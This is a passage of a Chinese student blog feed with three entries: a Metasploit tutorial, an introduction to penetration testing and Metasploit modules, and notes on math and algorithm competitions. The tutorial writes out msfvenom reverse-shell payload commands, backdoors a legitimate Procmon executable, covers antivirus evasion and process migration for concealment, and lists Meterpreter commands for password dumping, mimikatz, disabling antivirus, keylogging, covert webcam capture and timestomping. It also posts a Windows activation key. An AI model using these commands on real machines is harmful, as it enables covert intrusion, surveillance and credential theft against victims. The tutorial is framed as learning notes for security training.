指定操作系统<br>‐l：–list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all<br>‐n：–nopsled，指定 nop在 payload中的数量<br>‐f：–format，指定 Payload的输出格式（–‐list：列出所有可用的输出格式） php exe<br>‐e：–encoder，指定使用编码的encoder，用于免杀，X86/shikata_ga_nai是最流行的编码，Rank等级为excellent；解码<br>和编码过程都是随机生成的；cmd/powershell_base64也为excellent；<br>‐a：–<span class="hljs-built_in">arch</span>，指定目标系统架构 arm‐安卓 x86 mips工业系统‐路由器‐交换机<br>‐‐platform：指定目标系统平台 linux windows ios 安卓<br>‐s：–space，设置未经编码的 Payload的最大长度（–encoder‐space：编码后的 Payload的最大长度）<br>‐b：–bad‐chars，设置需要在 Payload中避免出现的字符，例如：’\0f’、’\x00’等<br>‐i：–iterations，设置 Payload的编码次数，理论上讲，编码的次数越高，免杀效果会越好<br>‐‐smallest：尽可能生成最短的 Payload<br>‐o：–out，保存 Payload到文件<br>‐c：–add‐code，指定一个附加的win32 shellcode文件<br>‐x：–template，指定一个特定的可执行文件作为模板<br>-k：–keep，保持模板程序的功能，注入的payload作为一个新的进程运行<br></code></pre></td></tr></table></figure><h5 id="一些类型的Payload"><a href="#一些类型的Payload" class="headerlink" title="一些类型的Payload"></a>一些类型的Payload</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">php：<br>msfvenom ‐p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.php<br>jsp：<br>Msfvenom ‐p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.jsp<br>python：<br>msfvenom ‐p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐fraw &gt; shell.py<br>bash：<br>msfvenom ‐p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.sh<br></code></pre></td></tr></table></figure><p>这里用msfvenom生成一个后门exe程序去获取反弹shell：<br><img src="/img/%E6%B8%97%E9%80%8F3.8.png" alt="图片" title="编码三次生成后门exe程序，payload为591字节、总的为7168字节，位置在文件系统的opt目录下面叫qq.exe"></p><p>实测下来经过了三次编码的后门程序不能运行，这里在生成后门的时候把编码删除就可以了，不过编码了免杀效果更强</p><p>lhost和lport是Metasploit Framework中的两个重要的配置选项,它们分别指定了本地主机的IP地址和端口号</p><p>生成好了之后要想办法上传到目标主机，在攻击机本地需要进行端口的监听，这里需要用到multi&#x2F;handler</p><p>本地测试的时候可以用vmware tools拖入拖出，kali一般会自带，win7可以参考：<a href="https://blog.csdn.net/weixin_45729764/article/details/134133548">这篇博客</a></p><p>一般来说在win7装好后会是普通版因为没有密钥，这里可以用破解工具或者直接用升级密钥，普通版会少很多东西，比如administartor的用户组就看不到 </p><p>win7普通版升级为旗舰版的激活密钥：6K2KY-BFH24-PJW6W-9GK29-TMPWP（好像一直能用</p><p><img src="/img/%E6%B8%97%E9%80%8F3.9.png" alt="图片" title="我的配置项，成功实施了攻击"></p><p>随后进入到meterpreter后渗透模块…</p><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>在Metasploit Framework（MSF）中，Meterpreter是一种强大的后渗透工具，用于在受攻击的系统上建立一个持久的、交互式的远程Shell。</p><p>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>这个部分介绍如何利用msf其中的后门生成功能将正常的软件改为后门软件，在受害者点击了之后便可以进行攻击。</p><p>这里使用Procmon64.exe，上传到opt目录之后，使用命令成功生成payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#替换为自己的ip和端口</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp -x /opt/Procmon64.exe -k lhost=192.168.56.132 lport=1689 -f exe &gt; /opt/procmon.exe<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.3.png" alt="图片" title="生成了带后门的procmon软件"></p><p>修改配置项，用我们生成的带后门的procmon软件进行攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="hljs-comment">#设置payload</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.4.png" alt="图片" title="配置改为1689端口，成功拿到shell"></p><p>如果希望对方在关闭软件后，会话依然可以保留，就需要在建立会话之后，迅速进行进程迁移</p><p>进程迁移是指为了不被受害者发现自己被攻击了从而把攻击进程伪装起来，通常是把shell进程藏在别的正常的进程中让人不易察觉。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启自动迁移进程</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> autorunscript migrate ‐f<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.5.png" alt="图片" title="成功迁移进程"><br>查看现在的进程号和迁移到的进程：</p><p><img src="/img/%E6%B8%97%E9%80%8F4.6.png" alt="图片" title="成功迁移到了进程号为1624的notepad进程"></p><h2 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h2><p>进入了meterpreter之后可以用 <code>help</code> 查看如何使用命令进行攻击</p><p>书接上文，拿到了meterpreter之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bg</span> <span class="hljs-comment">#暂挂</span><br>sessions <span class="hljs-comment">#查看有哪些会话</span><br>sessions -i 序号 <span class="hljs-comment">#进入会话</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.1.png" alt="图片" title="进入和退出会话"></p><p>这里可以看到操作失败权限不够，之后会提到如何提权：</p><p><img src="/img/%E6%B8%97%E9%80%8F4.2.png" alt="图片" title="还有hashdump可以获取密码的加密后的值"></p><p>拿到了shell之后通常先将进程迁入到explorer.exe</p><p>“explorer.exe是Windows程序管理器或者文件资源管理器。它用于管理Windows图形壳，包括桌面和文件管理，删除该程序会导致Windows图形界面无法使用。资源管理器explorer.exe进程为用户提供了图形用户界面（也称为图形壳），简单的说就是用来显示系统的桌面环境，包括桌面图标和文件管理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">migrate explorer进程号<br></code></pre></td></tr></table></figure><p>其余常用命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi <span class="hljs-comment">#加载mimikatz模块，它可以用来提取 Windows 系统中的密码和凭据信息。</span><br>ps <span class="hljs-comment">#查看目标主机进程信息</span><br>getuid <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem <span class="hljs-comment">#自动帮你提权,获得的当前用户是administrator才能成功</span><br>run killav <span class="hljs-comment">#关闭系统自带的杀毒软件</span><br><span class="hljs-built_in">pwd</span> <span class="hljs-comment">#查看目标主机当前目录(windows)</span><br>getlwd <span class="hljs-comment">#查看本地的当前目录(Linux)</span><br>lcd <span class="hljs-comment">#更改本地工作目录</span><br>lls <span class="hljs-comment">#列出本地文件</span><br>lpwd <span class="hljs-comment">#打印本地工作目录</span><br><br>search ‐f <span class="hljs-string">&#x27;*.jsp&#x27;</span> ‐d <span class="hljs-string">&#x27;e:\&#x27;</span> <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download E:\test.txt /root <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload /root/test.txt d:\<span class="hljs-built_in">test</span> <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid <span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>idletime <span class="hljs-comment">#查看主机运行时间</span><br><br>screenshot <span class="hljs-comment">#截图</span><br>webcam_list <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap <span class="hljs-comment">#拍照 ‐整个过程毫无查觉</span><br>webcam_stream <span class="hljs-comment">#开视频</span><br><br>execute 参数 ‐f 可执行文件 <span class="hljs-comment">#执行可执行程序</span><br><br>keyscan_start <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop <span class="hljs-comment">#停止键盘记录功能</span><br><br>uictl <span class="hljs-built_in">disable</span> keyboard <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl <span class="hljs-built_in">enable</span> keyboard <span class="hljs-comment">#允许目标使用键盘</span><br>uictl <span class="hljs-built_in">disable</span> mouse <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl <span class="hljs-built_in">enable</span> mouse <span class="hljs-comment">#允许目标使用鼠标</span><br><br>load <span class="hljs-comment">#加载扩展库</span><br>run <span class="hljs-comment">#使用扩展库</span><br>timestomp <span class="hljs-comment">#操作文件 MACE 属性</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这里就可以看到不要乱下载软件和安装包，藏个后门在软件里面轻而易举，再进行一下进程迁移甚至都不知道自己的电脑被黑了。乱下载东西很容易就会把你的电脑上线被别人获取信息，特别是那些莫名其妙的软件园千万别去碰，因为不知道里面藏有什么，从功能那里可以看到能进行很多的操作。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（1）</title>
    <link href="/1/"/>
    <url>/1/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>保完研把之前学的东西总结一遍，正好最近在上工程实训的课，借着复习一遍了，仅作为我的学习记录，没有高超的技术分享。</p><p>此系列主要是利用已有工具（脚本小子）进行攻击。</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>渗透测试就是利用学习掌握的技能通过一种模拟攻击的技术与方法，挫败目标系统的安全控制策略并获得控制访问权的安全测试方法，对网站进行渗透，发现其中的漏洞风险，并撰写报告告知客户，客户依据我们攥写的报告对漏洞和风险进行修补，防止攻击。</p><p>渗透测试的主要依据是CVE（Common Vulnerabilities and Exposures通用漏洞披露，会为漏洞命个名称，帮助用户共享数据）已经发现的安全漏洞，进行<strong>模拟黑客或入侵者的攻击</strong>，对网站应用、服务器系统和其他网络设备进行非破坏性质的攻击性测试</p><h3 id="常见端口及漏洞"><a href="#常见端口及漏洞" class="headerlink" title="常见端口及漏洞"></a>常见端口及漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 常利用的端口">21 —— FTP，查看是否存在匿名访问；<br>22 —— SSH，查看是否存在弱口令；<br>80 —— HTTP，常见web漏洞；<br>443 —— openssl，心脏出血；<br>445 —— smb、ms08‐067、ms17‐010；<br>1433 —— mssql，弱口令；<br>1521 —— oracle，弱口令；<br>3389 —— win远程桌面，弱口令；<br>6379 —— redis未授权访问，弱口令；<br>8080 —— tomcat漏洞<br></code></pre></td></tr></table></figure><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p><img src="/img/%E6%B8%97%E9%80%8F1.1.png" alt="图片" title="渗透测试的基本流程"></p><h3 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h3><p>漏洞：硬件、软件、协议等等的可利用<strong>安全缺陷</strong>，可能被攻击者利用，对数据进行篡改，控制等</p><p>CVE： CVE 的英⽂全称是“Common Vulnerabilities &amp; Exposures”<strong>公共漏洞披露</strong>。CVE为⼴泛认同的信息安全漏洞或者已经暴露出来的弱点给出㇐个统一的漏洞编号标准</p><p>PoC：全称“Proof of Concept”，中文“观点证明”，用于证明某种技术、漏洞或安全问题的存在。常指一段<strong>漏洞证明的代码</strong>，使得读者能够确认这个漏洞是真实存在的。<br>假设某个网站存在一个SQL注入漏洞，允许攻击者通过恶意输入执行数据库查询。一个POC可能是一段代码，可以在该网站的搜索框中注入恶意SQL语句，并获取敏感数据。这个POC可以证明该漏洞的存在，并帮助网站的管理员意识到需要修复这个问题。</p><p>Exp：全称“Exploit”，中文“漏洞利用”，指<strong>利用系统漏洞进行攻击的活动</strong>。EXP通常是用于利用已知漏洞的程序或脚本，以获取对目标系统的未授权访问、控制或执行特定操作的能力。PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。</p><p>Payload：中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。</p><p>小例子：<br>假如你是一名侦探，此时你正在监视某人，有一天你发现他家的窗户没关好，这可能是一个漏洞，你去推了推，发现推开了，那这就是一个Poc，你验证了这个漏洞的存在。第二天你你推窗进去了，查看了机密文件，并安装了窃听器，那这一套动作做的就是一个Exp，在他家所做的事情就是不同的Payload，窃听器就是一个Payload。</p><p>总结：<br>“Poc”相当于侦探发现并验证了窗户未关好的漏洞。<br>“Exp”相当于侦探利用这个漏洞进入房间，并且查看了文件，安装了窃听器。<br>“Payload”可以指侦探在房间里进行的各种行动，比如查看文件或安装窃听器。</p><p>还有其他一些通俗易懂的名词，比如shell、提权、后门、木马等等不过多赘述。</p><h3 id="价值作用"><a href="#价值作用" class="headerlink" title="价值作用"></a>价值作用</h3><p>渗透测试是我接触网安以来感觉最像黑客的事情，能获得系统的权限，更改系统的内容，进行信息的获取和修改，狠狠满足了黑客梦，对于就业来说也有相关的岗位，不过安全没有小厂，全都是大厂，这也就意味着门槛高薪资高。</p><p>学得好可以去hvv做红方，23年我朋友去的时候<strong>一天1500</strong>，自从<a href="https://www.bilibili.com/video/BV1Mu411E7AW/?spm_id_from=333.337.search-card.all.click&vd_source=9292f2260ddccfeb23b7d147e383d780">苕皮哥事件</a>后，今年我问了问只有几百了，大不如前但相比别的事情还是很多。</p><p><strong>有时候别太大胆了什么都测一下，不要被警察叔叔约谈了</strong></p><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>首先了解MSF，刚入门实力达不到自己写exp、payload所以就先当脚本小子，后面慢慢去熟悉其中的原理和利用细节。</p><h3 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h3><p>目前最流行、最强大、最具扩展性的渗透测试平台软件基于Metasploit进行渗透测试和漏洞分析的。</p><p>框架集成了渗透测试标准 (PTES） 思想一定程度上统一了渗透测试和漏洞研究的工作环境新的攻击代码可以比较容易的加入框架开发活跃版本更新频繁（每周）早期版本基于社区力量维护，被 Rapid 7收购后打造出其商业版产品目前分化为四个版本，社区版本依然十分活跃。</p><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。</p><p>通俗理解就是MSF里面集成好了各种exp，可以当脚本小子直接用。</p><h3 id="MSF分类"><a href="#MSF分类" class="headerlink" title="MSF分类"></a>MSF分类</h3><p><img src="/img/%E6%B8%97%E9%80%8F2.1.png" alt="图片" title="MSF的不同版本"><br>有这几种不同的版本，在kali里面用终端的免费版就够了。</p><h3 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h3><p>MSF所有的漏洞测试都是基于模块。</p><h4 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h4><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块。</p><p>辅助模块能在渗透之前得到目标系统丰富的情报信息，从而发起更具目标性的精准攻击。包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码口令破解、敏感信息嗅探、fuzz、实施网络协议欺骗等模块。</p><h4 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h4><p>利用系统漏洞进行攻击的动作，用于利用漏洞和传递有效负载的模块。有远程漏洞利用、本地漏洞利用、权限提升漏洞利用、客户端漏洞利用、Web 应用程序漏洞利用和许多其他漏洞。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。</p><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p>成功exploit之后，真正在目标系统执行的代码或指令。比如反弹shell的代码。分为3种类型的payload，分别是single、stages、和stagers。<br>single：一个完整的payload，不需要外部库，all-in-one<br>stager：目标计算机内存有限，先传输一个较小的payload用于建立连接<br>stages：利用stager建立的连接下载后续的payloadstager与stages有多种类型，适用于不同场景，shellcode是特殊的payload，其主要用于与目标主机建立shell。<br><img src="/img/%E6%B8%97%E9%80%8F2.2.png" alt="图片" title="payload"><br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Stager/Stage Payload的格式为：</span><br>&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt; 如：windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure></p><h4 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h4><p>编码器模块主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统用于有效负载编码和加密的模块，例如 base64、XOR、shikata_ga_nai 等。这有助于混淆以规避防病毒或NIDS（网络入侵检测系统）、EDR（端点检测和响应）等防御。</p><p>各大厂商已经针对msf做了防御，免杀需要额外进行编码加壳。</p><h4 id="nops"><a href="#nops" class="headerlink" title="nops"></a>nops</h4><p>metasploit框架中的空指令模块，用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</p><h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击，安装后门、记录键盘记录、屏幕捕获等操作。</p><h4 id="evasion"><a href="#evasion" class="headerlink" title="evasion"></a>evasion</h4><p>躲避模块，用来生成免杀payload 用于规避防御的模块，例如防病毒规避、AppLocker 绕过、软件限制策略 (SRP) 绕过等。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>竞赛记录汇总</title>
    <link href="/%E7%AB%9E%E8%B5%9B%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB/"/>
    <url>/%E7%AB%9E%E8%B5%9B%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>截一段简历的内容，有些奖项没有写，不太全。<br><img src="/img/%E7%AB%9E%E8%B5%9B.png" alt="图片" title="三年来的竞赛记录"></p><h2 id="数学类"><a href="#数学类" class="headerlink" title="数学类"></a>数学类</h2><h3 id="数学竞赛"><a href="#数学竞赛" class="headerlink" title="数学竞赛"></a>数学竞赛</h3><p>我是参加了2021年的<strong>全国大学生数学竞赛</strong>，那时候刚入学两个月，高数没怎么学拿了个二等奖。</p><p>据拿国一朋友的经验，打这个就和高中的数学竞赛一样，需要<strong>多刷题</strong>，但是这个对于保研来说也只是证明你的数学能力，这个比赛拿奖不如和老师专业对口的项目，拿国奖需要付出的时间比较多，总体来说<strong>性价比不高</strong>。<br><img src="/img/%E6%95%B0%E5%AD%A6%E7%AB%9E%E8%B5%9B.jpg" alt="图片" title="数学竞赛"></p><h3 id="数学建模"><a href="#数学建模" class="headerlink" title="数学建模"></a>数学建模</h3><h4 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h4><p>我参加的是2023年的<strong>全国大学生数学建模竞赛</strong>，舍友叫我一起参加，最终拿了国家二等奖。<br>我是负责<strong>代码</strong>部分的工作，总体上来说这个比赛<strong>性价比较高</strong>，能体现自己的能力但是老师不会在面试的时候针对性地问，不需要和数学竞赛一样进行大量的积累。<br>第一次的数学建模比赛是之前MathorCup杯拿了个国三，然后第二次就参加数模国赛了，有一两次的经历就能很快上手，主要还是看个人能力，备战这个的意义不大，熟悉python和matlab就好。</p><p>关于数学建模最重要的还是<strong>选题</strong>，对于本科生来说要在ABC三个里面选一个题，当时我们是选的A题，因为队伍中有人物理比较强。物理强的同学负责受力分析、建模，把建模后需要运算实现的东西由我来用代码实现，再给写论文的同学进行编写。</p><p>选题的时候主要看队伍的配置和可以找到的<strong>参考论文</strong>，队伍配置不用多说，很多人直接就会把A题给跳了因为队伍里面都不会物理，可以找到的参考论文对整个竞赛的过程帮助极大。<br>最好是去web of science或者谷歌学术上看看有没有选题相关的问题，再不济就去知网。当时我们的题目是定日镜场的排布，看论文知道一种规划叫campo排布，看了之后感觉很合理就用代码实现了，效果挺好的。</p><p>数学建模的整个过程就很像一场<strong>小的科研过程</strong>，从选题到找文献到建模实现到编写论文，当时三天几乎就睡了不到十个小时，最后拿奖了也是收获感满满没有白费三天熬夜。<br>拿到了国奖是要答辩的，<strong>答辩不好就是省奖</strong>，当时身边有两个队伍含泪省奖了，当时出了个小插曲，比赛结束了之后我报复性地把matlab删了，因为看到这东西就头疼。答辩前一天又被迫下回来了。</p><p>对于数学建模国赛的话网络上会有很多的资料和辅助代码，如果是想拿国奖的话<strong>建议不要借鉴</strong>。当时就有身边的同学借鉴网络上的资料，在各种公众号、闲鱼和qq微信群里。这种东西全国各地的同学都能看到，如果都用这个的话肯定都是一样的分数，想要做得好还得是自己要有东西，熟悉了基本工具的使用之后就看自己对数学的理解程度了，包括数据的处理方式，怎么优化算法等等。</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>数学建模先选好题，主要还是看<strong>队伍的配置</strong>量力而行，不要硬着头皮上：</p><p>A： 上限高下限低、容易拿大奖，但是<strong>难度大很容易做不完</strong>，做A的也是最少的<br>B： 介于AC之间<br>C： 很多新手第一次都选C，难度最低最多人做、<strong>最难拿大奖</strong>因为卷的人太多了</p><p>基本逻辑就是每个题目<strong>按照比例</strong>给奖，卷的人多就难拿，卷的人少就好拿。</p><p>接下来就看着每个小问一题一题地做，期间最好是能知道这个领域的sota进行一些借鉴，学习最开始的过程就是模仿。在写代码的时候注意<strong>不要硬编码</strong>当时本人水平有限全是硬编码导致队友很难上手我的代码。</p><p>到了最后两天的论文编写的时候都帮着点写论文的同学，现在<strong>AIGC</strong>很发达，可以多利用进行美化。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>队伍配置是最最最重要的，一定一定要<strong>找好队友</strong>，至少不要半路跑路。<br>要有个好的队长推进度，进行整个流程的<strong>各个步骤的时间管理</strong>，其次就是代码手要能实现建模的内容，由于AIGC现在特别强大，对于论文手的要求也变得更弱了。<br><img src="/img/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1.jpg" alt="图片" title="数学建模"></p><h2 id="算法类"><a href="#算法类" class="headerlink" title="算法类"></a>算法类</h2><p><strong>语言一定选C++</strong><br><strong>语言一定选C++</strong><br><strong>语言一定选C++</strong></p><p>算法强是真的有用，我认识一个学长是金牌爷夏令营机试ak直接上岸上交学硕了</p><h3 id="CCF-CSP认证"><a href="#CCF-CSP认证" class="headerlink" title="CCF-CSP认证"></a>CCF-CSP认证</h3><p>这个比赛可以说是从大一打到大三，历经三年，最后是440分，终于是和CSP分手了：<br><img src="/img/csp1.png" alt="图片" title="三年来的CSP成绩记录"></p><h4 id="第一阶段（0-200）"><a href="#第一阶段（0-200）" class="headerlink" title="第一阶段（0-200）"></a>第一阶段（0-200）</h4><p>首先大一的时候参加这个比赛几乎就只能做第一题，第一次考的时候第一题费尽心思模拟完结果爆了个<strong>Runtime Error</strong>，印象特别深。当时用的是C，具体是什么问题没搞清楚，感觉自己模拟完了应该能过，结果没过，心态大崩。当时第一题做了一个多小时，还记得那个下午做的特别痛苦。<br>解决方法就是刷题，不用去看什么算法视频，直接<strong>把往年的前两题全都刷完</strong>就能提升，主要还是模拟能力太强了，如果一二题都刷完了的话能达到100+的水平，有时候可能第二题不能优化过。<br>当时的我就把题目都刷了一遍，基本能达到200分：<br><img src="/img/csp2.png" alt="图片" title="狠狠刷了波往年的前两题"></p><h4 id="第二阶段（200-）"><a href="#第二阶段（200-）" class="headerlink" title="第二阶段（200+）"></a>第二阶段（200+）</h4><p>这个阶段的话就需要知道一些具体的算法了，比如最经典的前缀和、树状数组、二分等等，建议<strong>去Acwing上看算法基础课</strong>，基本看完算法基础课就能稳定200+了，前两题能ac后面的45也能骗点分，由于本人偏好不做第三题大模拟一般一二速通之后就去后面两题骗分了，可以来借我的Acwing账号，我之后估计也用不到了。<br><img src="/img/csp3.png" alt="图片" title="第二阶段的我"></p><h4 id="第三阶段（300-）"><a href="#第三阶段（300-）" class="headerlink" title="第三阶段（300+）"></a>第三阶段（300+）</h4><p>一般csp300分的话就是个分水岭了，达到300分一般分为两种：</p><p>A. 练第三题，123ac拿300分<br>B. 练动规贪心和图论等等优化，争取45多拿点，加上12题的200分</p><p>我是B路线，天生反感大模拟。这里的话建议把Acwing算法基础课的<strong>后两章</strong>都认真做一遍，掌握基础的知识点之后把之前的题目刷一刷，后两题大部分都是动态规划、贪心算法和图论。本来我的计划也是后两题拿个大部分的分凑够300去RUC或者北航抵掉机试的，结果意外后两题ac了，特别是最后一题的矩阵覆盖，感觉数据比较弱，熟练掌握二维前缀和以及线段覆盖应该就能做出来，十多行代码而已。<br><img src="/img/csp4.png" alt="图片" title="还是不会做第三题。。。"></p><h3 id="蓝桥杯"><a href="#蓝桥杯" class="headerlink" title="蓝桥杯"></a>蓝桥杯</h3><p>最大的感受就是去了就有省三。。。<br>有<strong>填空题、数学题、编程题</strong>，前面的填空题吃一点数学基础甚至有点像脑筋急转弯，后面就是正常的模拟和算法了。</p><h2 id="CTF类"><a href="#CTF类" class="headerlink" 